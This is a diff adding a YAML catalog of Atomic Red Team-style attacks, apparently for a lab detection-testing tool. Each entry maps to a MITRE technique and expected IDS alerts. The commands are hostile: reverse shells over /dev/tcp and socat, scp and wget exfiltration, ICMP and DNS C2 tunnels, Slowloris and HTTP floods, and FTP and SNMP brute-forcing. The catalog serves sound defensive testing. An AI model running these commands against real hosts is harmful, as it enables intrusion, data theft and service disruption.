@@ -1,0 +1,466 @@
+# attacks.yaml -- Agent Orange atomic red team catalog.
+#
+# Sibling to purple-agent/probes.yaml but intentionally divorced. This file
+# contains ONLY atomic-red-team attacks, with a stricter schema than the
+# purple-agent pool:
+#
+#   name                  -- unique identifier (required, snake-case w/ art- prefix)
+#   mitre                 -- primary MITRE ATT&CK technique (required)
+#   source                -- always "atomic-red-team" (required)
+#   art_test              -- provenance string mapping to ART atomic (required)
+#   rationale             -- one-line why-this-attack (required)
+#   target                -- attribution anchor (required; see below)
+#     type: victim | sni | external
+#     value: "{{VICTIM_IP}}" | SNI string | external IP/host
+#   expected_sids         -- Suricata SIDs expected to fire. Empty list means
+#                            "this attack is expected UNDETECTED by the current
+#                            rule stack." Do not put ambient canaries here
+#                            (9000003, 2001219) unless the attack IS a scan-type
+#                            technique where the canary IS the intended signal.
+#   expected_zeek_notices -- Zeek notice types expected. Empty list = none.
+#   expected_verdict      -- DETECTED_EXPECTED | UNDETECTED (no other values).
+#                            DETECTED_PARTIAL is a RUN outcome, not an
+#                            expectation, so it's not valid here.
+#   timeout               -- optional, seconds. Default 45. Hard ceiling; the
+#                            attack command should have its own `timeout N ...`
+#                            that's <= this value.
+#   command               -- bash to run on the ATTACKER (Kali). {{VICTIM_IP}}
+#                            is substituted at run time with the lab's private
+#                            VPC address of the victim.
+#
+# The set here is the initial port of the 23 ART-tagged entries from
+# purple-agent/probes.yaml as they existed at fork time. Drift is
+# deliberate -- Agent Orange curates independently from here on.
+
+attacks:
+
+  # ==========================================================================
+  # Tunnel services (SNI-targeted)
+  # ==========================================================================
+
+  - name: art-cloudflared-tunnel
+    mitre: T1572
+    source: atomic-red-team
+    art_test: "T1572 #7"
+    rationale: "cloudflared ephemeral tunnel -- TLS SNI *.trycloudflare.com"
+    target:
+      type: sni
+      value: "trycloudflare.com"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 15
+    command: |
+      timeout 10 cloudflared tunnel --url http://localhost:80 2>&1 | tail -10 || true
+      echo "cloudflared tunnel attempt completed -- expect SNI *.trycloudflare.com"
+
+  - name: art-devtunnels-ms
+    mitre: T1572
+    source: atomic-red-team
+    art_test: "T1572 #5"
+    rationale: "Microsoft Dev Tunnels -- SNI *.devtunnels.ms / tunnels.api.visualstudio.com"
+    target:
+      type: sni
+      value: "devtunnels.ms"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 15
+    command: |
+      curl -sS --max-time 5 "https://global.rel.tunnels.api.visualstudio.com/api/v1/tunnels" -o /dev/null 2>&1 || true
+      curl -sS --max-time 5 "https://devtunnels.ms/" -o /dev/null 2>&1 || true
+      echo "Dev Tunnels SNI handshakes sent"
+
+  - name: art-vscode-tunnel
+    mitre: T1572
+    source: atomic-red-team
+    art_test: "T1572 #6"
+    rationale: "VSCode `code tunnel` -- GitHub device-code + *.tunnels.api.visualstudio.com"
+    target:
+      type: sni
+      value: "tunnels.api.visualstudio.com"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 15
+    command: |
+      timeout 10 code tunnel --accept-server-license-terms 2>&1 | head -15 || true
+      echo "VSCode tunnel attempt completed"
+
+  # ==========================================================================
+  # Unique-protocol gaps (victim-targeted)
+  # ==========================================================================
+
+  - name: art-whois-tunnel
+    mitre: T1105
+    source: atomic-red-team
+    art_test: "T1105 #14"
+    rationale: "whois-as-tunnel -- raw TCP/8443 with whois protocol bytes"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 10
+    command: |
+      timeout 5 whois -h {{VICTIM_IP}} -p 8443 "Hello from Atomic Red Team test T1105" 2>&1 | head -5 || true
+      echo "whois tunnel attack sent to {{VICTIM_IP}}:8443"
+
+  - name: art-rsync-daemon-pull
+    mitre: T1105
+    source: atomic-red-team
+    art_test: "T1105 #1"
+    rationale: "rsync daemon anonymous pull on :873 -- @RSYNCD protocol banner"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 15
+    command: |
+      timeout 5 rsync --list-only "rsync://{{VICTIM_IP}}/" 2>&1 | head -10 || true
+      mkdir -p /tmp/art-rsync-pull
+      timeout 8 rsync -av "rsync://{{VICTIM_IP}}/public/" /tmp/art-rsync-pull/ 2>&1 | head -10 || true
+      rm -rf /tmp/art-rsync-pull
+
+  - name: art-scp-over-ssh-exfil
+    mitre: T1048
+    source: atomic-red-team
+    art_test: "T1048 #3"
+    rationale: "scp exfil over SSH -- asymmetric flow shape indicative of bulk staging"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 10
+    command: |
+      timeout 5 scp -o StrictHostKeyChecking=no -o PasswordAuthentication=no \
+        -o BatchMode=yes -o ConnectTimeout=3 \
+        /etc/hostname "ubuntu@{{VICTIM_IP}}:/tmp/art-loot" 2>&1 | head -5 || true
+      echo "scp exfil attempt completed (expected auth fail, SSH flow generated)"
+
+  - name: art-icmpdoor-c2
+    mitre: T1095
+    source: atomic-red-team
+    art_test: "T1095 #4"
+    rationale: "icmpdoor full ICMP C2 tunnel -- sustained bidirectional echo payloads"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 15
+    command: |
+      timeout 8 sudo /opt/icmpdoor/icmpdoor --interface eth0 --destination_ip {{VICTIM_IP}} 2>&1 | head -10 || true
+      echo "icmpdoor sent -- expect sustained bidirectional ICMP to victim"
+
+  # ==========================================================================
+  # SaaS exfil (SNI-targeted)
+  # ==========================================================================
+
+  - name: art-wget-post-https-exfil
+    mitre: T1048.002
+    source: atomic-red-team
+    art_test: "T1048.002 #3"
+    rationale: "wget --post-file HTTPS exfil -- distinctive Wget JA3 + TLS POST body"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 10
+    command: |
+      timeout 5 wget --post-file=/etc/hostname --timeout=5 --no-check-certificate \
+        "https://{{VICTIM_IP}}:8443/" -O /dev/null 2>&1 | head -10 || true
+      echo "wget HTTPS exfil completed"
+
+  - name: art-rclone-s3-sni
+    mitre: T1567.002
+    source: atomic-red-team
+    art_test: "T1567.002 #2"
+    rationale: "rclone UA + AWS S3 SNI -- cloud exfil fingerprint"
+    target:
+      type: sni
+      value: "s3.us-east-1.amazonaws.com"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 10
+    command: |
+      curl -sS --max-time 3 -A 'rclone/v1.69.3' \
+        "https://fake-atomic-test.s3.us-east-1.amazonaws.com/" -o /dev/null 2>&1 || true
+      echo "rclone-style S3 exfil SNI sent"
+
+  # ==========================================================================
+  # Scanning / discovery (victim-targeted)
+  # ==========================================================================
+
+  - name: art-gobuster-dvwa-dir-enum
+    mitre: T1595.003
+    source: atomic-red-team
+    art_test: "T1595.003 (gobuster)"
+    rationale: "gobuster directory brute-force against DVWA :8081 -- rapid 404 burst + UA"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 45
+    command: |
+      timeout 30 gobuster dir -u "http://{{VICTIM_IP}}:8081" \
+        -w /usr/share/wordlists/dirb/common.txt -q -t 10 --no-color \
+        --timeout 3s 2>&1 | tail -15 || true
+
+  - name: art-masscan-syn-burst
+    mitre: T1046
+    source: atomic-red-team
+    art_test: "T1046 (masscan)"
+    rationale: "masscan fast SYN scan -- 1000pps burst, timing distinct from nmap"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 30
+    command: |
+      timeout 20 sudo masscan {{VICTIM_IP}} -p 22,80,443,445,3389,8080,8081,8443 \
+        --rate 1000 --wait 0 2>&1 | tail -10 || true
+
+  # ==========================================================================
+  # Reverse-shell variants (victim-targeted)
+  # ==========================================================================
+
+  - name: art-socat-tls-reverse-shell
+    mitre: T1059.004
+    source: atomic-red-team
+    art_test: "T1059.004 (socat TLS)"
+    rationale: "socat TLS reverse-shell connect -- distinct JA3 vs. nc baseline"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 10
+    command: |
+      timeout 5 bash -c 'echo "id" | socat - OPENSSL-CONNECT:{{VICTIM_IP}}:4444,verify=0' 2>&1 | head -5 || true
+      echo "socat TLS reverse shell attempt completed"
+
+  - name: art-bash-dev-tcp-reverse-shell
+    mitre: T1059.004
+    source: atomic-red-team
+    art_test: "T1059.004 (bash /dev/tcp)"
+    rationale: "Pure-bash /dev/tcp reverse shell -- no binary fingerprint, flow-only"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 10
+    command: |
+      timeout 3 bash -c 'exec 3<>/dev/tcp/{{VICTIM_IP}}/4445; echo "/bin/sh -i" >&3; sleep 1; exec 3<&-' 2>&1 || true
+      echo "bash /dev/tcp reverse shell pattern sent to :4445"
+
+  # ==========================================================================
+  # High-confidence regression -- expected DETECTED (victim-targeted)
+  # ==========================================================================
+
+  - name: art-malicious-ua-fanout
+    mitre: T1071.001
+    source: atomic-red-team
+    art_test: "T1071.001 #3"
+    rationale: "Classic APT-simulator User-Agent fan-out -- ET MALWARE HttpBrowser etc."
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    # Initial port: verdict set UNDETECTED until real SIDs are enumerated from
+    # an actual lab run. Upgrade to DETECTED_EXPECTED with populated SIDs in a
+    # follow-up once the rule stack's response is observed.
+    expected_verdict: UNDETECTED
+    timeout: 20
+    command: |
+      curl -sS --max-time 3 -A 'HttpBrowser/1.0' "http://{{VICTIM_IP}}/" >/dev/null 2>&1 || true
+      curl -sS --max-time 3 -A 'Wget/1.9+cvs-stable (Red Hat modified)' "http://{{VICTIM_IP}}/" >/dev/null 2>&1 || true
+      curl -sS --max-time 3 -A 'Opera/8.81 (Windows NT 6.0; U; en)' "http://{{VICTIM_IP}}/" >/dev/null 2>&1 || true
+      curl -sS --max-time 3 -A '*<|>*' "http://{{VICTIM_IP}}/" >/dev/null 2>&1 || true
+      echo "4 malicious UAs sent"
+
+  # ==========================================================================
+  # Anonymity / proxy (SNI-targeted)
+  # ==========================================================================
+
+  - name: art-tor-bootstrap
+    mitre: T1090.003
+    source: atomic-red-team
+    art_test: "T1090.003 #3"
+    rationale: "Tor client bootstrap -- directory-authority TLS, ET TOR reputation hits"
+    target:
+      # Tor bootstrap reaches a small pool of hardcoded directory authorities.
+      # Using `sni` with a torproject.org substring attributes the handshake
+      # events in ssl.log (moria1.torproject.org etc.); Suricata IP-based ET
+      # TOR rules that fire on DA dest_ips without SNI context may miss
+      # attribution under the current (SNI/exact-IP) model -- a known limitation
+      # worth tracking as a future attribution-model enhancement.
+      type: sni
+      value: "torproject.org"
+    expected_sids: [2400004, 2520110, 2522110, 2522306, 2522710]
+    expected_zeek_notices: []
+    expected_verdict: DETECTED_EXPECTED
+    timeout: 25
+    command: |
+      TORDIR=$(sudo mktemp -d /tmp/art-tor-XXXXXX)
+      timeout 15 sudo tor --DataDirectory "$TORDIR" --SocksPort 9051 --Log 'notice stderr' 2>&1 | head -15 || true
+      sudo rm -rf "$TORDIR" 2>/dev/null || true
+      echo "tor bootstrap completed -- expect ET TOR on DA IPs"
+
+  # ==========================================================================
+  # Exercise idle attacker tools + new victim listeners (victim-targeted)
+  # ==========================================================================
+
+  - name: art-ffuf-dvwa-dir-enum
+    mitre: T1595.003
+    source: atomic-red-team
+    art_test: "T1595 parent (ffuf community)"
+    rationale: "ffuf content discovery vs DVWA -- distinct UA Fuzz Faster u Fool + 404 burst"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 45
+    command: |
+      timeout 30 ffuf -u "http://{{VICTIM_IP}}:8081/FUZZ" \
+        -w /usr/share/wordlists/dirb/common.txt -t 40 -mc 200,301,302 \
+        -s -noninteractive 2>&1 | tail -15 || true
+
+  - name: art-slowhttptest-slowloris
+    mitre: T1499.002
+    source: atomic-red-team
+    art_test: "T1499.002 (community -- no ART atomic)"
+    rationale: "Slowloris slow-headers DoS vs nginx :80 -- ET POLICY Slowloris"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 60
+    command: |
+      timeout 45 slowhttptest -c 500 -H -i 10 -r 200 -t GET \
+        -u "http://{{VICTIM_IP}}/" -x 24 -p 3 -l 30 2>&1 | tail -10 || true
+
+  - name: art-ab-http-flood-dvwa
+    mitre: T1499.003
+    source: atomic-red-team
+    art_test: "T1499.003 (community -- no ART atomic)"
+    rationale: "ApacheBench flood vs DVWA -- UA ApacheBench/x.x + high request rate"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 30
+    command: |
+      timeout 20 ab -n 5000 -c 50 -r -q "http://{{VICTIM_IP}}:8081/login.php" 2>&1 | tail -15 || true
+
+  - name: art-dnscat-dns-tunnel
+    mitre: T1071.004
+    source: atomic-red-team
+    art_test: "T1071.004 #3"
+    rationale: "dnscat2 client handshake -- long base32 subdomain queries, QTYPE diversity"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 25
+    command: |
+      timeout 15 dnscat --dns "server={{VICTIM_IP}},port=53" \
+        --secret=purple-lab-atomic purple-dnscat.example.com 2>&1 | head -15 || true
+
+  - name: art-hydra-ftp-brute
+    mitre: T1110.001
+    source: atomic-red-team
+    art_test: "T1110.001"
+    rationale: "FTP password brute vs vsftpd :21 -- exercises anonymous listener auth path"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 45
+    command: |
+      printf 'admin\nroot\nftp\nanonymous\n'  > /tmp/art-ftp-users.txt
+      printf 'password\n123456\nadmin\nftp\n' > /tmp/art-ftp-pass.txt
+      timeout 30 hydra -L /tmp/art-ftp-users.txt -P /tmp/art-ftp-pass.txt \
+        -t 4 "ftp://{{VICTIM_IP}}" 2>&1 | tail -10 || true
+      rm -f /tmp/art-ftp-users.txt /tmp/art-ftp-pass.txt
+
+  - name: art-snmp-community-brute
+    mitre: T1110.001
+    source: atomic-red-team
+    art_test: "T1110.001 (SNMP community -- community brute)"
+    rationale: "SNMP community string enumeration -- ET rules on repeated GetRequest with varying communities"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 30
+    command: |
+      for c in public private admin cisco snmp community manager monitor default; do
+        timeout 2 snmpget -v1 -c "$c" "{{VICTIM_IP}}" 1.3.6.1.2.1.1.1.0 2>&1 | head -1
+      done
+
+  - name: art-remote-access-software-sni
+    mitre: T1219
+    source: atomic-red-team
+    art_test: "T1219 (multi-tool SNI sweep)"
+    rationale: "AnyDesk/TeamViewer/RustDesk/Atera SNI -- T1219 remote access software fingerprinting"
+    target:
+      type: sni
+      value: "anydesk.com,teamviewer.com,master7.teamviewer.com,rustdesk.com,agent.atera.com,instance.screenconnect.com"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 45
+    command: |
+      for domain in anydesk.com teamviewer.com master7.teamviewer.com \
+                    rustdesk.com agent.atera.com instance.screenconnect.com; do
+        echo "--- $domain ---"
+        timeout 5 openssl s_client -connect "$domain:443" -servername "$domain" \
+          </dev/null 2>/dev/null | head -3
+      done
+
+  - name: art-knock-port-knock-sequence
+    mitre: T1205.001
+    source: atomic-red-team
+    art_test: "T1205.001 (community -- no ART atomic)"
+    rationale: "Port knock sequence -- 4 rapid TCP SYNs to closed high ports then SSH"
+    target:
+      type: victim
+      value: "{{VICTIM_IP}}"
+    expected_sids: []
+    expected_zeek_notices: []
+    expected_verdict: UNDETECTED
+    timeout: 15
+    command: |
+      knock -v "{{VICTIM_IP}}" 7000 8000 9000 1234 2>&1 | head -5 || true
+      timeout 3 bash -c "echo QUIT | nc -w 2 {{VICTIM_IP}} 22" 2>&1 | head -2 || true
+      echo "port knock sequence sent -- expect conn.log burst to 7000/8000/9000/1234"
